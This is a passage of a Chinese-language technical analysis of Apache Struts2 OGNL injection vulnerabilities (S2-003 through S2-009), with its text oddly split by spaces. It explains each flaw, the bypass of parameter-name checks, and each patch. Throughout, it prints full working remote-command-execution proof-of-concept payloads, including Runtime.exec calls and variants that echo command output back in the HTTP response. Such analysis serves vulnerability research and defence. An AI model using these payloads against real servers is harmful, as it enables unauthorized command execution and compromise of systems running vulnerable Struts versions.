( ) ,   # writer . println ( # str ) ,   # writer . flush ( ) ,   # writer . close ( )   % { # pb = ( new   java . lang . ProcessBuilder ( \" whoami \" ) ) . start ( ) , # is = # pb . getInputStream ( ) , # isr = new   java . io . InputStreamReader ( # is ) , # br = new   java . io . BufferedReader ( # isr ) , # chars = new   char [ 500 ] , # br . read ( # chars ) , # str = new   java . lang . String ( # chars ) , # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) ,   # writer . println ( # str ) , # writer . flush ( ) , # writer . close ( ) }   \u4fee\u590d   \u5728 > = 2.0 . 9 \u7248\u672c \u7684 struts2 \u4e0a \uff0c   com . opensymphony . xwork2 . util . TextParseUtil # translateVariables   \u505a \u4e86 \u5faa\u73af \u5224\u65ad \uff0c \u4e0d \u5141\u8bb8 \u9012\u5f52 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u9ed8\u8ba4   maxLoopCount   \u4e3a 1 \uff0c \u6240\u4ee5 \u5904\u7406 \u5b8c   % { name }   \u540e \uff0c \u4e0d\u4f1a \u518d \u7ee7\u7eed \u5bf9 \u4ed6 \u7684 \u503c \u8fdb\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u4e86 \u3002   2 .   S2 - 003   \u5f71\u54cd \u8303\u56f4 \uff1a 2.0 . 0   -   2.0 . 11.2   \u770b\u5b98 \u7f51 \u7684 \u4ecb\u7ecd \uff0c \u95ee\u9898 \u51fa \u5728   ParametersInterceptor   \uff0c \u524d\u9762 \u5229\u7528 \u4e86   Ognl . getValue   \u6765 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u800c S2 - 003 \u7528 \u7684 \u5219 \u662f   Ognl . setValue   \uff0c \u8be5 \u51fd\u6570 \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   source :   \u53c2\u6570 \u7684 key \uff0c \u4f7f\u7528 unicode \u7f16\u7801 \u7ed5\u8fc7   #   \u7684 \u68c0\u6d4b   sink :   \u8c03\u7528   Ognl . setValue   \u6f0f\u6d1e \u5206\u6790   Struts2 \u5728 \u5904\u7406 \u53c2\u6570 \u5185\u5bb9 \u65f6 \uff0c \u5c06 \u8c03\u7528   com . opensymphony . xwork2 . interceptor . ParametersInterceptor # setParameters   \u51fd\u6570 \uff0c \u586b\u5145 \u5230 OgnlVauleStack \u7684 context \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u91cc \u3002   \u8fd9\u91cc \u4f1a \u5148\u8fc7 \u4e00\u6b21   acceptableName   \u7684 \u68c0\u67e5 \uff08 2.0 . 8 \u7248\u672c \uff09   \u4e0d\u80fd \u51fa\u73b0   =   \u3001   ,   \u3001   #   \u3001   :   \u4ee5\u53ca \u88ab \u6392\u9664 \u5728\u5916 \u7684 \u53c2\u6570 \u540d   \u53ea\u6709 \u901a\u8fc7 \u4e86 acceptableName \u51fd\u6570 \u7684 \u68c0\u67e5 \u624d\u80fd \u7ee7\u7eed \u5f80\u4e0b \u4e0b\u8d70 \u5f80\u4e0b\u8d70 \uff0c \u6240\u4ee5 \u6211\u4eec \u5fc5\u987b \u7ed5\u8fc7 \u4e0a\u9762 \u7684 \u51e0\u4e2a \u95ee\u9898 \uff0c \u8fd9\u91cc \u6f0f\u6d1e \u53d1\u73b0 \u53d1\u73b0\u8005 \u7528 \u4e86 unicode \u7f16\u7801 \u6765 \u7ed5\u8fc7 \u68c0\u6d4b \u3002   ognl . JavaCharStream # readChar   \u5f53 \u9047\u5230   \\ u   unicode \u7f16\u7801 \uff0c \u4f1a \u505a \u4e00\u6b21 \u8f6c\u6362 \uff0c \u6bd4\u5982   \\ u0040   \u4f1a \u88ab \u8f6c\u6210   @   \u800c   acceptableName   \u51fd\u6570 \u5e76 \u6ca1\u6709 \u8003\u8651 unicode \u7f16\u7801 \u7684 \u65b9\u5f0f \uff0c \u5bfc\u81f4 \u5176 \u5f62\u540c \u865a\u8bbe \u5f62\u540c\u865a\u8bbe \u3002   \u56de\u5230   setParameters   \uff0c \u540e\u7eed \u8c03\u7528 \u4e86   OgnlValueStack . setValue   \u8fd9\u91cc \u6700\u7ec8 \u5230 \u4e86   OgnlUtil . setValue   \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   POC \u5206\u6790   \u6765\u770b \u4e00\u4e2a \u8c03\u7528 \u547d\u4ee4 \u6267\u884c \u7684 POC   (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) (   bla   )   &   (   ' \\   u0040java   .   lang   .   Runtime   @ getRuntime   ( ) .   exec   (   \\ '   open   /   System   /   Applications   /   Calculator   .   app   \\   ' ) '   ) (   bla   ) (   bla   )   \u5148 \u6765\u770b \u7b2c\u4e00 \u4e00\u53e5 \u7b2c\u4e00\u53e5 \uff0c \u8be5\u6761 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7528\u4e8e \u5f00\u542f \u65b9\u6cd5 \u6267\u884c \uff0c \u56e0\u4e3a \u5728 \u8c03\u7528   setParameters   \u4e4b\u524d \uff0c \u5f00\u53d1 \u53d1\u4eba \u4eba\u5458 \u5f00\u53d1\u4eba\u5458 \u8003\u8651 \u5230 \u4e86 \u53c2\u6570 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u98ce\u9669 \uff0c \u6240\u4ee5 \u63d0\u524d \u5173\u95ed \u4e86 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u6267\u884c   \u8bbe\u7f6e \u5b8c \u4e86 \u4e4b\u540e \uff0c \u518d \u8fd8\u539f \u56de\u6765   \u4f46\u662f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u5bf9\u4e8e \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u7684 \u5185\u5bb9 \u662f \u53ef\u63a7 \u7684 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5728 \u8fdb\u884c \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u524d \uff0c \u5c06 context \u91cc \u7684   xwork . MethodAccessor . denyMethodExecution   \u8bbe \u4e3a   false   \uff0c   \u8fd9\u6837 \u7b2c\u4e8c \u4e8c\u53e5 \u7b2c\u4e8c\u53e5 poc \u5c31 \u53ef\u4ee5 \u6267\u884c \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86 \u3002   \u6240\u4ee5 \u5728 \u53d1\u9001 \u8fd9 \u4e24\u6761 POC \u65f6 \uff0c \u9700\u8981 \u63a7\u5236 \u597d \u8bbe\u7f6e false \u5728 \u524d \uff0c \u6267\u884c \u5728 \u540e \uff08 ascii \u6392\u5e8f \uff0c \u53ef\u4ee5 \u770b \u56de\u663e poc \u7684 \u5904\u7406 \uff09   \u8ddf \u524d\u9762 \u4e00\u6837 \uff0c \u5199 \u4e00\u4e0b \u56de\u663e \u7684 POC   (   a   ) ( (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) )   (   b   ) ( (   ' \\   u0023ret   \\   u003d   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   \\ '   id   \\   ' ) '   ) (   bla   ) )   &   / /   \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   (   c   ) ( (   ' \\   u0023dis   \\   u003dnew   \\   u0020java   .   io   .   DataInputStream   (   \\   u0023ret   .   getInputStream   ( ) )   '   ) (   bla   ) )   &   (   d   ) ( (   ' \\   u0023res   \\   u003dnew   \\   u0020byte   [   2000   ]   '   ) (   bla   ) )   &   (   e   ) ( (   ' \\   u0023dis   .   readFully   (   \\   u0023res   )   '   ) (   bla   ) )   &   (   f   ) ( (   ' \\   u0023writer   \\   u003d   \\   u0023context   .   get   (   \\ '   com   .   opensymphony   .   xwork2   .   dispatcher   .   HttpServletResponse   \\ '   ) .   getWriter   ( )   '   ) (   bla   ) )   &   (   g   ) ( (   ' \\   u0023writer   .   println   (   new   \\   u0020java   .   lang   .   String   (   \\   u0023res   ) )   '   ) (   bla   ) )   &   / /   \u83b7\u53d6 response \uff0c \u56de\u663e \u6570\u636e   (   h   ) ( (   ' \\   u0023writer   .   flush   ( )   '   ) (   bla   ) )   &   (   i   ) ( (   ' \\   u0023writer   .   close   ( )   '   ) (   bla   ) )   \u8fd9\u91cc poc \u7684 \u5148\u540e \u987a\u5e8f \u5148\u540e\u987a\u5e8f \u7528\u5230 \u4e86 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u4f4d\u7f6e \uff0c \u5b9e\u9645 \u7684 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u653e\u5230 \u4e86 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u4f4d\u7f6e   ( 1 ) ( ( 2 ) ( 3 ) )   \u4fee\u590d   xwork > = 2.0 . 6   com . opensymphony . xwork2 . interceptor . ParametersInterceptor # setParameters   \u591a \u4e86 \u4ee5\u4e0b \u4ee3\u7801   \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u7528 \u7684 \u76f4\u63a5 \u662f \u5df2 \u5b58\u5728 \u7684 OgnlValueStack \uff0c \u4ece 2.0 . 6 \u5f00\u59cb \uff0c \u4f7f\u7528 \u4e86 \u4e00\u4e2a \u7a7a \u7684 stack \u6765 \u5904\u7406 \u53c2\u6570 \u7684 \u89e3\u6790   \u5e76\u4e14 \u4ece \u8fd9\u4e2a \u7248\u672c \u5f00\u59cb \u591a \u4e86 SecurityMemberAccess \uff0c \u7528\u6765 \u9650\u5236 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u4e2d \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528   \u5728   ognl . OgnlRuntime # callAppropriateMethod   \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u524d \uff0c \u4f1a \u53bb \u5224\u65ad \u51fd\u6570 \u662f\u5426 \u53ef \u88ab \u8bbf\u95ee ( method \u4e0d\u4e3a null )   \u5176\u5b9e \u8fd9\u8fb9   isMethodAccessible   \u7684 \u8fd4\u56de \u7ed3\u679c \u65e0\u6240 \u6240\u8c13 \u65e0\u6240\u8c13 \uff0c \u4f46\u662f \u4e0d\u80fd \u5728 \u8fd9\u4e2a \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u65f6 \u51fa\u9519 \uff0c \u51fa\u9519 \u7684\u8bdd \u4e5f \u5c31 \u8d70 \u4e0d\u5230   invokeMethod   \u770b \u4e00\u4e0b \u5177\u4f53 \u7684 \u5b9e\u73b0 \uff0c   isMethodAccessible   \u7684 \u5224\u65ad \u4f9d\u8d56 \u8d56\u4e8e \u4f9d\u8d56\u4e8e   SecurityMemberAccess   \u8fd9\u91cc \u6211\u4eec \u4e3b\u8981 \u770b   isAcceptableProperty   \u4e0b \u7aef\u70b9 \u8c03\u8bd5 \u4f60 \u4f1a \u53d1\u73b0 \u8fd9\u4e2a \u7248\u672c acceptProperties \u4e3a\u7a7a \uff0c \u800c excludeProperties \u975e\u7a7a \uff0c \u6240\u4ee5 \u5728 \u8c03\u7528   isExclude   \u51fd\u6570 \u65f6 \uff0c \u6b63\u5219 \u8c03\u7528   pattern . matcher ( null )   \u4f1a \u62a5\u9519 \uff0c \u4e5f \u5c31 \u65e0\u6cd5 \u8fbe\u5230 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u7684 \u76ee\u7684 \u4e86 \uff08   propertiesName   \u4e3a null \uff09 \u3002   \u6240\u4ee5 \u5982\u679c \u8981 \u7ed5\u8fc7 \u8fd9\u4e2a \u7248\u672c \u7684 \u9650\u5236 \uff0c \u9996\u5148 \u9700\u8981 \u89e3\u51b3 \u7684 \u662f \u8fd9\u4e2a \u51fd\u6570 \u7684 \u62a5\u9519 \u95ee\u9898 \uff0c \u770b S2 - 005   3 .   S2 - 005   \u5f71\u54cd \u7248\u672c \uff1a struts2.0 . 0   -   2.1 . 8.1   S2 - 005 \u4e3a S2 - 003 \u7684 \u4fee\u590d \u7ed5\u8fc7 \uff0c \u76f4\u63a5 \u5206\u6790 POC   POC \u5206\u6790   (   ' \\   u0023 _ memberAccess   .   excludeProperties   \\   u003d   @ java . util . Collections @ EMPTY _ SET   '   ) (   bla   ) (   bla   )   &   (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) (   bla   )   &   (   ' \\   u0040java   .   lang   .   Runtime   @ getRuntime   ( ) .   exec   (   \\ '   open   \\   u0020   /   System   /   Applications   /   Calculator   .   app   \\   ' ) '   ) (   bla   ) (   bla   )   \u524d\u9762 S2 - 003 \u4fee\u590d \u90e8\u5206 \u8bf4 \u5230 \u4e86 \u9700\u8981 \u7ed5\u8fc7   isAcceptableProperty   \u51fd\u6570 \u62a5\u9519 \u7684 \u95ee\u9898 \u624d\u80fd \u7ee7\u7eed \u5f80 \u4e0b \u8fdb\u884c \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u3002   \u4ece \u4ee3\u7801 \u4e0a \u770b \uff0c \u53ea\u8981   excludeProperties   \u548c   acceptProperties   \u4e3a\u7a7a \uff0c \u5c31 \u4e0d\u4f1a \u8fdb \u5230 \u6b63\u5219 \u5339\u914d \u7684 \u73af\u8282 \uff0c \u6240\u4ee5 \u9700\u8981 \u5c06 \u4ed6\u4eec \u7f6e \u4e3a \u7a7a   poc \u91cc \u7684 \u7b2c\u4e00 \u4e00\u884c \u7b2c\u4e00\u884c \u505a \u7684 \u5c31\u662f \u8fd9\u4e2a \u4e8b\u60c5 \uff0c \u5c06   excludeProperties   \u7f6e \u4e3a \u7a7a\u96c6 \u96c6\u5408 \u7a7a\u96c6\u5408   \u8fd9\u91cc \u770b \u4e00\u4e0b \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u4ee5   #_ memberAccess   \u7684 \u65b9\u5f0f \u53ef\u4ee5 \u8bbf\u95ee \u5230   OgnlContext   \u5bf9\u8c61 \u7684   memberAccess   \u5c5e\u6027   ognl . OgnlContext # get   \u4ece   OgnlContext   \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u83b7\u53d6 \u5185\u5bb9 \uff0c \u9996\u5148 \u4f1a \u5224\u65ad \u662f\u5426 \u5728   RESERVED _ KEYS   \u96c6\u5408 \u91cc \uff0c \u5982\u679c \u5b58\u5728 \uff0c \u5219 \u76f8\u5e94 \u7684 \u8c03\u7528 \u4ed6 \u7684 getters \uff0c \u5982\u679c \u4e0d \u5b58\u5728 \uff0c \u5219 \u4ece \u5f53\u524d \u7684 \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 \u91cc \u53bb \u627e \u8fd9\u4e2a key \u3002   \u6240\u4ee5   #_ memeberAccess   \u5b9e\u9645 \u83b7\u53d6 \u7684 \u662f   OgnlContext   \u7684   memeberAccess   \u5c5e\u6027 \u5185\u5bb9   \u8fd8\u6709 \u51fa\u73b0 \u53d8\u5316 \u7684 \u5730\u65b9 \uff0c \u7531\u4e8e \u73b0\u5728 context \u91cc \u662f \u6ca1\u6709 response \u5bf9\u8c61 \u53ef\u4ee5 \u83b7\u53d6 \u7684 \uff0c \u6240\u4ee5 \u5728 \u5904\u7406 \u56de\u663e \u7684 \u65f6\u5019 \u6211\u4eec \u9700\u8981 \u627e \u53e6\u5916 \u7684 \u65b9\u6cd5   (   a   ) ( (   ' \\   u0023 _ memberAccess   .   excludeProperties   \\   u003d   @ java . util . Collections @ EMPTY _ SET   '   ) (   bla   ) )   &   (   a   ) ( (   ' \\   u0023context   [   \\ '   xwork   .   MethodAccessor   .   denyMethodExecution   \\ '   ]   \\   u003dfalse   '   ) (   bla   ) )   &   (   b   ) ( (   ' \\   u0023ret   \\   u003d   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   \\ '   id   \\   ' ) '   ) (   bla   ) )   &   / /   \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   (   c   ) ( (   ' \\   u0023dis   \\   u003dnew   \\   u0020java   .   io   .   DataInputStream   (   \\   u0023ret   .   getInputStream   ( ) )   '   ) (   bla   ) )   &   (   d   ) ( (   ' \\   u0023res   \\   u003dnew   \\   u0020byte   [   2000   ]   '   ) (   bla   ) )   &   (   e   ) ( (   ' \\   u0023dis   .   readFully   (   \\   u0023res   )   '   ) (   bla   ) )   &   (   f   ) ( (   ' \\   u0023writer   \\   u003d   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( )   '   ) (   bla   ) )   &   (   g   ) ( (   ' \\   u0023writer   .   println   (   new   \\   u0020java   .   lang   .   String   (   \\   u0023res   ) )   '   ) (   bla   ) )   &   / /   \u83b7\u53d6 response \uff0c \u56de\u663e \u6570\u636e   (   h   ) ( (   ' \\   u0023writer   .   flush   ( )   '   ) (   bla   ) )   &   (   i   ) ( (   ' \\   u0023writer   .   close   ( )   '   ) (   bla   ) )   \u8fd9\u91cc \u4f7f\u7528 \u4e86   @ org . apache . struts2 . ServletActionContext @ getResponse ( )   \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u6765 \u83b7\u53d6 response   \u4fee\u590d   xwork > = 2.2 . 1.1 \uff0c \u5bf9 \u53c2\u6570 \u540d \u505a \u4e86 \u66f4\u4e3a \u7ec6\u81f4 \u7684 \u6b63\u5219 \u68c0\u67e5   [ a - zA - Z0 - 9 \\ \\ . \\ \\ ] \\ \\ [ \\ \\ ( \\ \\ ) _ ' \\ \\ s ] +   4 .   S2 - 007   \u8fd9\u91cc \u8ddf S2 - 008 \u91cc\u9762 \u7684 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u6f0f\u6d1e \u4e00\u6837   com . opensymphony . xwork2 . interceptor . ConversionErrorInterceptor # intercept   value \u4e3a \u6211\u4eec \u4f20\u5165 \u7684 \u6570\u636e \uff0c \u8fc7 \u4e86 \u4e00\u6b21 getOverrideExpr   \u5bf9 \u6211\u4eec \u7684 \u8f93\u5165 \u56f4\u4e0a \u4e86 \u5f15\u53f7 \u5355\u5f15\u53f7 \uff0c \u8fd9\u91cc \u5982\u679c \u6211\u4eec \u7684 payload \u4e3a   ' + xxxx + '   \uff0c \u8fd9\u91cc \u7684 xxxx \u5c31 \u9003\u9038 \u51fa\u6765 \u4e86 \uff0c \u800c \u4e0d\u5355 \u5355\u5355 \u5355\u5355\u662f \u4e0d\u5355\u5355\u662f \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4e86   \u540e\u7eed \u5c06 \u5904\u7406 \u597d \u7684 \u6570\u636e \u653e\u5230 \u4e86 stack \u7684 overrides \u91cc\u9762   \u800c \u5b9e\u9645 \u89e6\u53d1 \u7684 \u5730\u65b9 \u8ddf S2 - 001 \u4e00\u6837 \uff0c \u662f \u5728 \u89e3\u6790 JSP \u7684 \u65f6\u5019 \u9020\u6210 \u7684   \u5728   tryFIndValue   \u51fd\u6570 \u4e2d \uff0c \u4ece stack \u7684 overrides \u4e2d \u53d6\u51fa \u524d\u9762 \u52a0 \u4e86 \u5f15\u53f7 \u5355\u5f15\u53f7 \u7684 \u6570\u636e \uff0c \u5e76 \u5728 \u540e\u7eed \u8c03\u7528   Ognl . getValue   \uff0c \u5bfc\u81f4 \u4e86 Ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u3002   POC   '   +   (   #   _ memberAccess   .   allowStaticMethodAccess   =   true   ,   #   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) )   +   '   xwork > = 2.2 . 3 \uff0c ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8ba1\u7b97 \u65f6 \uff0c \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u7684 \u51fd\u6570 \u5224\u65ad   isAcceptableProperty   \u5982\u679c name \u4e3a null \u76f4\u63a5 \u8fd4\u56de true \uff0c \u6240\u4ee5 \u6211\u4eec \u4e0d\u7528 \u50cf s2 - 005 \u90a3\u6837 \u628a   excludeProperties   \u7f6e \u4e3a \u7a7a\u96c6 \u96c6\u5408 \u7a7a\u96c6\u5408 \u3002   \u4f46\u662f \u4ece \u8fd9\u91cc \u5f00\u59cb \uff0c   allowStaticMethodAccess   \u9ed8\u8ba4 \u4e3a false \uff0c \u6211\u4eec \u9700\u8981 \u5c06 \u5176\u7f6e \u4e3a true \uff0c \u624d\u80fd \u6b63\u5e38 \u6267\u884c \u9759\u6001 \u51fd\u6570 \u3002   \u6240\u4ee5 POC \u7b2c\u4e00 \u4e8c\u53e5 \u90fd \u662f \u5728 \u89e3\u9664 \u9650\u5236 \u89e3\u9664\u9650\u5236 \uff0c \u7b2c\u4e09 \u4e09\u53e5 \u7b2c\u4e09\u53e5 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   \u5199 \u4e00\u4e0b \u56de\u663e \u7684 POC   '   +   (   #   _ memberAccess   .   allowStaticMethodAccess   =   true   ,   #   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   #   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   #   isr   =   new   java   .   io   .   InputStreamReader   (   #   ret   .   getInputStream   ( ) ) ,   #   br   =   new   java   .   io   .   BufferedReader   (   #   isr   ) ,   #   res   =   new   char   [   2000   ]   ,   #   br   .   read   (   #   res   ) ,   #   writer   =   #   context   [   '   com   .   opensymphony   .   xwork2   .   dispatcher   .   HttpServletResponse   '   ]   .   getWriter   ( ) ,   #   writer   .   println   (   new   java   .   lang   .   String   (   #   res   ) ) ,   #   writer   .   flush   ( ) ,   #   writer   .   close   ( )   )   +   '   5 .   S2 - 008   S2 - 008 \u4e00\u5171 \u6709 4 \u4e2a \u6f0f\u6d1e \uff0c \u8be6\u7ec6 \u770b https : / / cwiki . apache . org / confluence / display / WW / S2 - 008   \u5176\u4e2d 1 \u8ddf S2 - 007 \u7c7b\u4f3c \uff0c 3 \u4e0d\u770b \u4e86 \uff0c \u4e3b\u8981 \u5173\u6ce8 2 \u548c 4   CookieInterceptor   \u8fd9\u91cc \u7684 \u539f\u7406 \u540c S2 - 005 \u7c7b\u4f3c \uff0c \u8fd9\u91cc \u770b \u4ee3\u7801 \u6bd4\u8f83 \u76f4\u89c2 \uff0c \u6ca1\u6709 \u642d \u73af\u5883 \u8c03 \u4e86   org . apache . struts2 . interceptor . CookieInterceptor # intercept   \u8fd9\u91cc \u4f1a\u5230   OgnlValueStack . setValue   \uff0c \u4e5f \u5c31\u662f \u540e\u7eed \u8c03\u7528   Ognl . setValue   \uff0c \u7528   ( ( 1 ) ( 2 ) ) ( 3 )   \u7684 \u65b9\u5f0f \u6765 \u6267\u884c \u4efb\u610f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   DebuggingInterceptor   \u5f53 \u5f00\u542f \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \u65f6 \uff0c \u4f20\u5165   debug = command & expression = xxxx   \uff0c \u5373\u53ef \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   POC   ?   debug   =   command   &   expression   =   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) )   / /   \u56de\u663e POC   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   %   23   isr   =   new   java   .   io   .   InputStreamReader   (   %   23   ret   .   getInputStream   ( ) ) ,   %   23   br   =   new   java   .   io   .   BufferedReader   (   %   23   isr   ) ,   %   23   res   =   new   char   [   2000   ]   ,   %   23   br   .   read   (   %   23   res   ) ,   new   java   .   lang   .   String   (   %   23   res   ) )   6 .   S2 - 009   \u5f71\u54cd \u8303\u56f4 \uff1a 2.0 . 0   -   2.3 . 1.1   \u9488\u5bf9 S2 - 005 \u7684 \u4fee\u590d \uff0c \u5bf9 \u53c2\u6570 \u505a   [ a - zA - Z0 - 9 \\ \\ . \\ \\ ] \\ \\ [ \\ \\ ( \\ \\ ) _ ' \\ \\ s ] +   \u6b63\u5219 \u68c0\u67e5 \uff0c \u8fd9\u91cc \u89c4\u907f \u4e86 \u53c2\u6570 \u540d\u4e2d \u51fa\u73b0   #   \u3001 unicode \u7f16\u7801 \u7b49   S2 - 009 \u662f \u5bf9 S2 - 005 \u7684 \u7ed5\u8fc7 \uff0c \u8fd9\u91cc \u7528 \u7684 \u5c31\u662f   Ognl . setValue   \u51fd\u6570 \u7684 \u53e6 \u4e00\u79cd \u7528\u6cd5   a [ ( 1 ) ( 2 ) ]   \uff0c \u8fd8\u6709 \u4e00\u4e2a \u6bd4\u8f83 \u5de7\u5999 \u7684 \u662f \uff0c \u524d\u9762 \u7684 \u51e0\u4e2a \u6f0f\u6d1e \u5229\u7528 \uff0c \u6211\u4eec \u90fd \u662f \u76f4\u63a5 \u5728   ( 1 )   \u5199 \u4e0a \u8981 \u6267\u884c \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u800c S2 - 009 \u5219 \u901a\u8fc7 context \u91cc \u7684 \u5185\u5bb9 \u6765 \u8fdb\u884c \u4e00\u4e2a \u4e2d\u8f6c \uff0c \u5c06 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u653e\u5230   key = value   \u7684 value \u7684 \u4f4d\u7f6e \uff0c \u518d \u7531   a [ ( key ) ( 2 ) ]   \u7684 \u65b9\u5f0f \u53bb \u6267\u884c value \u7684 \u5185\u5bb9 \u3002   OgnlContext   context   =   new   OgnlContext   ( ) ;   context   .   put   (   \" test \"   ,   \" @ java . lang . Runtime @ getRuntime ( ) . exec ( \\ ' open   / System / Applications / Calculator . app / \\ ' ) \"   ) ;   / /   \u5047\u8bbe context \u5b58\u5728 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f test   Ognl   .   setValue   (   \" a [ ( test ) ( bla ) ] \"   ,   context   ,   \" \"   ) ;   / /   \u4ee5 a [ ( test ) ( bla ) ] , \u6267\u884c test \u6240 \u4ee3\u8868 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u4e0a\u9762 \u4ee3\u7801 \u4e2d \u7684 \u5047\u8bbe \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 \u4f20\u5165   ? param = xxx   \u7684 \u65b9\u5f0f \u5e26\u5165   \u6ce8\u610f \u8fd9\u91cc \u7684 param \u9700\u8981 \u662f \u5f53\u524d Action \u7684 \u4e00\u4e2a \u7c7b \u5c5e\u6027 \uff08 \u4e5f \u5c31\u662f \u539f\u672c \u5c31 \u5b58\u5728 \u7684 \u53c2\u6570 \u540d \uff09 \uff0c \u6bd4\u5982 \u539f\u672c \u8868\u5355 \u91cc \u5c31 \u6709 password \uff0c \u90a3\u4e48 \u4f60 \u5c31 \u53ef\u4ee5 \u5728 password \u91cc\u9762 \u586b\u5145 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u56e0\u4e3a \u5728 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   ( password ) ( bla )   \u7684 \u65f6\u5019 ( \u89e3\u6790 \u51fa \u4e24\u4e2a ASTProperty )   \u540e\u7eed \u518d \u6267\u884c \u8fc7\u7a0b \u4e2d \uff0c \u4f1a \u53bb \u67e5\u627e \u5f53\u524d \u7684 action \u91cc\u9762 \u662f\u5426 \u542b\u6709 \u8fd9\u4e2a \u5c5e\u6027   com . opensymphony . xwork2 . ognl . accessor . CompoundRootAccessor # getProperty   \u5982\u679c \u5f53\u524d \u5b58\u5728 \u8fd9\u4e2a \u5c5e\u6027 \u7684 \u65f6\u5019 \uff0c \u8fd4\u56de \u5176 \u5185\u5bb9   \u540e\u7eed \u5c31\u662f \u8ddf   ( 1 ) ( 2 )   \u8fd9\u79cd \u6267\u884c \u7684 \u539f\u7406 \u4e00\u6837 \uff0c \u4f1a\u4ee5   ( 1 )   \u4f5c\u4e3a node \u8c03\u7528 getValue \u3002   \u8fd9\u91cc \u5de7\u5999 \u7684 \u5c31\u662f \u5229\u7528 \u8fd9\u79cd \u4e2d\u8f6c \u7684 \u65b9\u5f0f \uff0c \u89c4\u907f \u4e86 \u53c2\u6570 \u540d \u7684 \u6b63\u5219 \u68c0\u6d4b   POC   ?   password   =   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   %   23   context   [   '   xwork   .   